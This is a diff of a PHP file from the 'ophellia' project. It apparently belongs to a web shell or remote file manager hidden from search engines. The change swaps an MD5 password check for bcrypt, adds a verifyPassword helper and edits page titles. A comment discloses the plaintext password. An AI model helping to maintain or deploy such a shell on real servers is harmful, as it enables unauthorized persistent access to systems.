@@ -11,7 +11,9 @@ github.com/elliottophellia/ophellia
 
 // Configuration
 const VERSION = '2.0.0';
-const PASSWORD_HASH = '4f88cdff6be6a175c58836aed671b3aa'; // honeycomebear
+const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2'; // honeycomebear
+// Use "<?php echo password_hash('your_new_password', PASSWORD_BCRYPT);" to generate a new password hash
+// Or go to https://onlinephp.io/password-hash ($algo = PASSWORD_BCRYPT, $cost = 10)
 
 // Utility functions
 function hexToString(string $hex): string
@@ -27,6 +29,11 @@ function stringToHex(string $string): string
 function safeFileWrite(string $filename, string $content): bool
 {
     return file_put_contents($filename, $content) !== false;
+}
+
+function verifyPassword(string $password): bool
+{
+    return password_verify($password, PASSWORD_HASH);
 }
 
 function formatFileSize($bytes): string
@@ -222,8 +229,10 @@ class Elliottophellia
 
     private function isAuthenticated(): bool
     {
-        if (isset($this->post['pass']) && md5($this->post['pass']) === PASSWORD_HASH) {
-            $_SESSION['authenticated'] = true;
+        if (isset($this->post['pass'])) {
+            if (verifyPassword($this->post['pass'])) {
+                $_SESSION['authenticated'] = true;
+            }
         }
 
         return $_SESSION['authenticated'] ?? false;
@@ -237,8 +246,8 @@ class Elliottophellia
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <meta name="robots" content="noindex, nofollow" />
-            <title>Welcome!</title>
-            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v2.0.0.css">
+            <title>WELCOME!</title>
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
             <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
         </head>
         <body>
@@ -260,8 +269,8 @@ class Elliottophellia
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Ophellia v' . VERSION . '</title>
-            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v2.0.0.css">
+            <title>OPHELLIA v' . VERSION . '</title>
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
             <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
         </head>
